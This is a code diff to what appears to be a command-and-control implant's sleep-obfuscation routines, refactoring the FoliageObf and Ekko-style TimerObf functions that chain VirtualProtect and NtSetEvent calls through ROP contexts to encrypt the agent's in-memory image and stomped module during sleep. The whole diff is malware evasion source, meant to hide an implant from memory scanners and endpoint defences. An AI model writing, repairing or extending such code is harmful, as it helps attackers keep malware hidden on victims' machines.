@@ -77,6 +77,7 @@ VOID FoliageObf(
     //Rop memory protections
     PCONTEXT            RopMemProtect = {0};
 
+    SIZE_T PEHeaderSize = 0;
     DWORD Cnt = 60;
     PPAGEPROTECT_PARAM PageProtectParams = {0};
     DWORD NumberOfSections = 0;
@@ -543,6 +544,10 @@ Leave:
         Instance.Win32.LocalFree(RopCopyPayload);
         RopCopyPayload = NULL;
     }
+    if(RopMemProtect != NULL){
+        Instance.Win32.LocalFree(RopMemProtect);
+        RopMemProtect = NULL;
+    }
     if ( RopExitThd != NULL ) {
         Instance.Win32.LocalFree( RopExitThd );
         RopExitThd = NULL;
@@ -614,7 +619,7 @@ Leave:
     }
 
     if ( Instance.Session.Rc4PayloadModule.Buffer != NULL){
-        MemSet(Instance.Session.Rc4PayloadModule.Buffer,0,(SIZE_T)Instance.Session.Rc4PayloadModule.Length);
+        RtlSecureZeroMemory(Instance.Session.Rc4PayloadModule.Buffer,(SIZE_T)Instance.Session.Rc4PayloadModule.Length);
     }
     MemSet( &Rc4, 0, sizeof( USTRING ) );
     MemSet( &Key, 0, sizeof( USTRING ) );
@@ -659,13 +664,14 @@ BOOL TimerObf(
     USTRING Img       = { 0 };
     USTRING KeyStomped  = { 0 };
     USTRING Rc4Stomped  = { 0 };
-    PVOID   ImgBase   = { 0 };
-    ULONG   ImgSize   = { 0 };
-
+    PVOID   ImageBase   = { 0 };
+    SIZE_T   ImageSize   = { 0 };
     /* rop/thread contexts */
     CONTEXT TimerCtx  = { 0 };
     CONTEXT ThdCtx    = { 0 };
-    CONTEXT Rop[ 50 ] = { { 0 } };
+    PCONTEXT Rop = NULL;
+    Rop = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT )*50 );
+    //CONTEXT Rop[ 50 ] = { { 0 } };
 
     /* some vars */
     DWORD    Value     = 0;
@@ -680,8 +686,6 @@ BOOL TimerObf(
     DWORD NumberOfSections = 0;
     PPAGEPROTECT_PARAM PageProtectParams = {0};
 
-    LPVOID              ImageBase   = NULL;
-    SIZE_T              ImageSize   = 0;
     LPVOID              TxtBase     = NULL;
     SIZE_T              TxtSize     = 0;
     DWORD               dwProtect   = PAGE_EXECUTE_READWRITE;
@@ -745,8 +749,8 @@ BOOL TimerObf(
         Key.Length = Key.MaximumLength = sizeof(Buf);
 
         /* set agent memory pointer and size */
-        Img.Buffer = ImgBase = Instance.Session.ModuleBase;
-        Img.Length = Img.MaximumLength = ImgSize = Instance.Session.ModuleSize;
+        Img.Buffer = ImageBase = Instance.Session.ModuleBase;
+        Img.Length = Img.MaximumLength = ImageSize = Instance.Session.ModuleSize;
     }
     if ( Method == SLEEPOBF_EKKO ) {
         NtStatus = Instance.Win32.RtlCreateTimerQueue( &Queue );
@@ -825,9 +829,9 @@ BOOL TimerObf(
                     if(Rc4Stomped.Buffer != NULL){
                         /* Protect */
                         Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
-                        Rop[ Inc ].Rcx = U_PTR( ImgBase );
+                        Rop[ Inc ].Rcx = U_PTR( ImageBase );
                         //TODO: replace ImageSize with Rc4Stomped.Length
-                        Rop[ Inc ].Rdx = U_PTR( ImgSize );
+                        Rop[ Inc ].Rdx = U_PTR( ImageSize );
                         Rop[ Inc ].R8  = U_PTR( PAGE_READWRITE );
                         Rop[ Inc ].R9  = U_PTR( &Value );
                         Inc++;
@@ -848,9 +852,9 @@ BOOL TimerObf(
 
                         /*Restore stomped module pages to RX*/
                         Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
-                        Rop[ Inc ].Rcx = U_PTR( ImgBase );
+                        Rop[ Inc ].Rcx = U_PTR( ImageBase );
                         //TODO: replace ImageSize with Rc4Stomped.Length
-                        Rop[ Inc ].Rdx = U_PTR( ImgSize );
+                        Rop[ Inc ].Rdx = U_PTR( ImageSize );
                         Rop[ Inc ].R8  = U_PTR( PAGE_EXECUTE_READ );
                         Rop[ Inc ].R9  = U_PTR( &Value );
                         Inc++;
@@ -858,8 +862,8 @@ BOOL TimerObf(
                     else{
                         /* Protect */
                         Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
-                        Rop[ Inc ].Rcx = U_PTR( ImgBase );
-                        Rop[ Inc ].Rdx = U_PTR( ImgSize );
+                        Rop[ Inc ].Rcx = U_PTR( ImageBase );
+                        Rop[ Inc ].Rdx = U_PTR( ImageSize );
                         Rop[ Inc ].R8  = U_PTR( PAGE_READWRITE );
                         Rop[ Inc ].R9  = U_PTR( &Value );
                         Inc++;
@@ -978,14 +982,13 @@ BOOL TimerObf(
                             (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
                             PageProtectParams[i].Protection = PAGE_EXECUTE_READWRITE;
 
-                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
-                        Rop[ Inc ].Rcx = U_PTR( PageProtectParams[i].SecMemory );
-                        Rop[ Inc ].Rdx = U_PTR( PageProtectParams[i].SecMemorySize );
-                        Rop[ Inc ].R8  = U_PTR( PageProtectParams[i].Protection );
-                        Rop[ Inc ].R9  = U_PTR( &Value );
+                        Rop[Inc].Rip = U_PTR(Instance.Win32.VirtualProtect);
+                        Rop[Inc].Rcx = U_PTR(PageProtectParams[i].SecMemory);
+                        Rop[Inc].Rdx = U_PTR(PageProtectParams[i].SecMemorySize);
+                        Rop[Inc].R8 = U_PTR(PageProtectParams[i].Protection);
+                        Rop[Inc].R9 = U_PTR(&Value);
                         Inc++;
                     }
-
                     /* End of Ropchain */
                     Rop[ Inc ].Rip = U_PTR( Instance.Win32.NtSetEvent );
                     Rop[ Inc ].Rcx = U_PTR( EvntDelay );
@@ -1029,13 +1032,15 @@ BOOL TimerObf(
     }
 
 
-
 LEAVE: /* cleanup */
     if ( Queue ) {
         Instance.Win32.RtlDeleteTimerQueue( Queue );
         Queue = NULL;
     }
 
+    if(Instance.Session.Rc4PayloadModule.Buffer != NULL){
+        RtlSecureZeroMemory(Instance.Session.Rc4PayloadModule.Buffer,Instance.Session.Rc4PayloadModule.Length);
+    }
     if ( EvntTimer ) {
         SysNtClose( EvntTimer );
         EvntTimer = NULL;
@@ -1062,10 +1067,11 @@ LEAVE: /* cleanup */
     }
 
     /* clear the structs from stack */
-    for ( int i = 0; i < 13; i++ ) {
+    for ( int i = 0; i < 50; i++ ) {
         RtlSecureZeroMemory( &Rop[ i ], sizeof( CONTEXT ) );
     }
-
+    Instance.Win32.LocalFree(Rop);
+    Instance.Win32.LocalFree(PageProtectParams);
     /* clear key from memory */
     RtlSecureZeroMemory( Buf, sizeof( Buf ) );
 
